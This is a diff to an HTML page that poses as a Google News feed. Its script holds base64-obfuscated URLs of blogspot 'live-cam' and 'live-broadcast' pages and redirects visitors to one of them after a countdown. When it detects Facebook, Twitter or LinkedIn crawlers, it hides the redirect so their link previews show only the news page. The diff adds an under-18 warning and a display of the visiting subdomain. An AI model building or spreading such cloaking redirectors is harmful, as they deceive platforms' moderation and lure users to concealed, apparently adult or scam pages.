@@ -16,14 +16,22 @@
             text-align: center;
             background: #ff4444;
             color: white;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 10px;
         }
         .countdown-number {
-            font-size: 2rem;
+            font-size: 1.2rem;
             font-weight: bold;
             margin: 5px 0;
+        }
+        .subdomain-info {
+            background: #e9ecef;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+            text-align: center;
+            font-family: monospace;
         }
         .news-container {
             background: white;
@@ -57,14 +65,17 @@
     </style>
 </head>
 <body>
-    
     <div class="simple-countdown" id="countdown-section">
         <div>Please wait</div>
         <div class="countdown-number" id="countdown">7</div>
-        <div>Redirecting to content...</div>
+        <div>Warning! The content you are about to watch may not be appropriate for viewers under 18 years old.</div>
     </div>
 
-    
+    <div class="subdomain-info" id="subdomain-info">
+        Access from: <span id="current-subdomain">Loading...</span>
+    </div>
+
+    <!-- RSS NEWS PHÍA DƯỚI -->
     <div class="news-container">
         <h2 style="text-align: center; margin-bottom: 20px;">📰 Latest News</h2>
         <div id="news-container">
@@ -73,32 +84,38 @@
     </div>
 
     <script>
-        
         const ENCRYPTED_TARGETS = [
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
         ];
 
-        
+        function getCurrentSubdomain() {
+            const hostname = window.location.hostname;
+            const parts = hostname.split('.');
+            
+            if (parts.length >= 3 && parts[1].includes('xbling')) {
+                return parts[0];
+            }
+            return 'main';
+        }
+
         function decryptTarget(encrypted) {
             return atob(encrypted);
         }
 
-       
         function getRandomTarget() {
             const randomIndex = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
-            return decryptTarget(ENCRYPTED_TARGETS[randomIndex]);
+            const encryptedTarget = ENCRYPTED_TARGETS[randomIndex];
+            return decryptTarget(encryptedTarget);
         }
 
-        
         function isFacebookBot() {
             return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
         }
 
-        
+        // 📡 GOOGLE NEWS RSS - SỬA LỖI
         async function loadGoogleNews() {
             try {
-               
                 const rssUrl = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
                 
                 const response = await fetch(`https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssUrl)}`);
@@ -128,19 +145,16 @@
                 
             } catch (error) {
                 console.log('RSS failed, using direct fetch...');
-               
                 loadGoogleNewsDirect();
             }
         }
 
-       
         async function loadGoogleNewsDirect() {
             try {
                 const rssUrl = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
                 const response = await fetch(`https://cors-anywhere.herokuapp.com/${rssUrl}`);
                 const xmlText = await response.text();
                 
-                // Parse XML manually
                 const items = xmlText.match(/<item>[\s\S]*?<\/item>/g) || [];
                 let newsHTML = '';
                 const newsCount = Math.min(items.length, 8);
@@ -173,10 +187,15 @@
             }
         }
 
-       
         function startCountdown() {
+            const currentSubdomain = getCurrentSubdomain();
+            const targetSite = getRandomTarget();
+            
+            document.getElementById('current-subdomain').textContent = currentSubdomain;
+            
             if (isFacebookBot()) {
                 document.getElementById('countdown-section').style.display = 'none';
+                document.getElementById('subdomain-info').style.display = 'none';
                 return;
             }
             
@@ -189,7 +208,6 @@
                 
                 if (seconds <= 0) {
                     clearInterval(timer);
-                    const targetSite = getRandomTarget();
                     window.location.href = targetSite;
                 }
             }, 1000);
